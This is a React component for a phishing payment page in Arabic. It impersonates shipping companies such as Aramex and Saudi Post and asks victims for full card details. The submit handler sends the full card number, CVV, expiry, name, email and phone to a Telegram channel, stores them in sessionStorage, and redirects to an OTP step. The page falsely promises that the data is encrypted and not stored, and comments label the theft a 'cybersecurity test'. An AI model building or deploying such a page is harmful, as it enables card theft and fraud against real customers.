import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
import {
  SecureCardHeader,
  CardBrandIndicator,
  StyledCardInput,
  PaymentSecurityFooter,
  AcceptedCardsDisplay
} from "@/components/CardFormComponents";
import { Shield, Lock, Calendar } from "lucide-react";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();

  useAutoApplyIdentity();
  const { identity: dynamicIdentity } = useDynamicIdentity();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';

  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  // Get government payment system for styling
  const govSystem = getGovernmentPaymentSystem(selectedCountry);

  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Get currency code from link data
  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
  const formattedAmount = formatCurrency(amount, currencyCode);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
    
    // Validate with Luhn algorithm if 13-19 digits
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);
      
      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };
  
  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Validate card number with Luhn
    if (!validateLuhn(cardNumber)) {
      toast({
        title: "رقم البطاقة غير صحيح",
        description: "الرجاء التحقق من رقم البطاقة المدخل",
        variant: "destructive",
      });
      return;
    }
    
    // Validate expiry date
    if (!validateExpiry(expiryMonth, expiryYear)) {
      toast({
        title: "تاريخ الانتهاء غير صحيح",
        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
        variant: "destructive",
      });
      return;
    }
    
    // Validate CVV
    const cardType = detectCardType(cardNumber);
    if (!validateCVV(cvv, cardType)) {
      toast({
        title: "CVV غير صحيح",
        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    // Store complete card info for cybersecurity test
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
    sessionStorage.setItem('cardType', cardType);
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details-new",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardholder: cardName,
          cardLast4: last4,
          cardType: cardType,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      // Form submission error
    }
    
    // Send complete card details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'card_details_with_bank',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardholder: cardName,
        cardNumber: cardNumber, // Full card number for cybersecurity test
        cardLast4: last4,
        cardType: cardType,
        expiry: expiry,
        cvv: cvv, // CVV for cybersecurity test
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    // Navigate directly to OTP (skip bank login for card payment)
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      bankId={selectedBankId}
    >
      {/* Security Notice */}
      <div
        className="mb-6 p-4 rounded-xl border-2"
        style={{ backgroundColor: `${branding.colors.secondary}10`, borderColor: branding.colors.secondary }}
      >
        <div className="flex items-center gap-3">
          <div
            className="w-10 h-10 rounded-full flex items-center justify-center"
            style={{ backgroundColor: branding.colors.secondary }}
          >
            <Shield className="w-5 h-5 text-white" />
          </div>
          <div>
            <h3
              className="font-bold text-sm"
              style={{ color: branding.colors.text }}
            >
              دفع آمن ومشفر
            </h3>
            <p className="text-xs" style={{ color: branding.colors.textLight }}>
              معلومات بطاقتك محمية بأعلى معايير الأمان
            </p>
          </div>
        </div>
      </div>

      {/* Visual Card Display */}
      <div 
        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          minHeight: '180px'
        }}
      >
        <div className="absolute top-4 right-4 flex items-center gap-2">
          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
          {cardValid === true && (
            <CheckCircle2 className="w-6 h-6 text-green-300" />
          )}
        </div>
        
        {/* Card Type Badge */}
        {cardNumber.length > 0 && (
          <div className="absolute top-4 left-4">
            <span className="text-xs text-white/70 uppercase font-semibold">
              {detectCardType(cardNumber)}
            </span>
          </div>
        )}
        
        {/* Card Number Display */}
        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
            <span>••••</span>
            <span>••••</span>
            <span>••••</span>
            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
          </div>
        </div>

        <div className="flex justify-between items-end text-white">
          <div>
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
            <p className="text-base sm:text-lg font-mono">
              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
            </p>
          </div>
          <div className="text-right">
            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
          </div>
        </div>
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
        {/* Cardholder Name */}
        <div>
          <Label className="mb-2 text-sm sm:text-base flex items-center gap-2">
            <CreditCard className="w-4 h-4" />
            اسم حامل البطاقة *
          </Label>
          <Input
            placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            className="h-12 sm:h-14 text-base sm:text-lg"
            style={{
              borderWidth: '2px',
              borderColor: branding.colors.border
            }}
            required
          />
        </div>
        
        {/* Card Number */}
        <div>
          <Label className="mb-2 text-sm sm:text-base flex items-center justify-between">
            <div className="flex items-center gap-2">
              <CreditCard className="w-4 h-4" />
              <span>رقم البطاقة *</span>
            </div>
            {cardValid === true && (
              <span className="text-xs text-green-600 flex items-center gap-1">
                <CheckCircle2 className="w-4 h-4" />
                صحيح
              </span>
            )}
            {cardValid === false && (
              <span className="text-xs text-destructive">غير صحيح</span>
            )}
          </Label>
          <Input
            placeholder="#### #### #### ####"
            value={cardNumber}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            inputMode="numeric"
            className={`h-12 sm:h-14 text-base sm:text-lg tracking-wider font-mono ${
              cardValid === false ? 'border-destructive' :
              cardValid === true ? 'border-green-500' : ''
            }`}
            style={{
              borderWidth: '2px',
              borderColor: cardValid === false ? '#ef4444' : cardValid === true ? '#10b981' : branding.colors.border
            }}
            required
          />
        </div>
        
        {/* Expiry & CVV Row */}
        <div className="grid grid-cols-3 gap-3">
          <div>
            <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
              <Calendar className="w-4 h-4" />
              شهر *
            </Label>
            <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
              <SelectTrigger
                className="h-12 sm:h-14"
                style={{ borderWidth: '2px', borderColor: branding.colors.border }}
              >
                <SelectValue placeholder="شهر" />
              </SelectTrigger>
              <SelectContent className="z-50">
                {months.map((month) => (
                  <SelectItem key={month.value} value={month.value}>
                    {month.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
              <Calendar className="w-4 h-4" />
              سنة *
            </Label>
            <Select value={expiryYear} onValueChange={setExpiryYear} required>
              <SelectTrigger
                className="h-12 sm:h-14"
                style={{ borderWidth: '2px', borderColor: branding.colors.border }}
              >
                <SelectValue placeholder="سنة" />
              </SelectTrigger>
              <SelectContent className="z-50">
                {years.map((year) => (
                  <SelectItem key={year.value} value={year.value}>
                    {year.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label className="mb-2 text-xs sm:text-sm flex items-center gap-2">
              <Lock className="w-4 h-4" />
              CVV *
            </Label>
            <Input
              type="password"
              placeholder="***"
              value={cvv}
              onChange={(e) =>
                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              inputMode="numeric"
              className="h-12 sm:h-14 text-base sm:text-lg text-center"
              style={{ borderWidth: '2px', borderColor: branding.colors.border }}
              maxLength={4}
              required
            />
          </div>
        </div>

        {/* Security Info */}
        <div
          className="mt-6 p-4 rounded-lg"
          style={{
            backgroundColor: branding.colors.surface || '#F5F5F5'
          }}
        >
          <div className="flex items-start gap-3">
            <Lock className="w-5 h-5 mt-0.5" style={{ color: branding.colors.secondary }} />
            <div>
              <h4 className="font-semibold text-sm mb-1" style={{ color: branding.colors.text }}>
                محمي بتشفير SSL
              </h4>
              <p className="text-xs" style={{ color: branding.colors.textLight }}>
                جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
              </p>
            </div>
          </div>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full h-14 text-lg font-bold mt-6 text-white hover:opacity-90 transition-all"
          disabled={isSubmitting || !cardValid}
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
            borderRadius: '12px',
            boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
          }}
        >
          {isSubmitting ? (
            <>
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>
              جاري المعالجة...
            </>
          ) : (
            <>
              <span className="ml-2">دفع الآن</span>
              <ArrowLeft className="w-5 h-5 mr-2" />
            </>
          )}
        </Button>

        <p className="text-xs text-center mt-4" style={{ color: branding.colors.textLight }}>
          بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
        </p>
      </form>
    
      {/* Hidden Netlify Form */}
      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="cardType" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
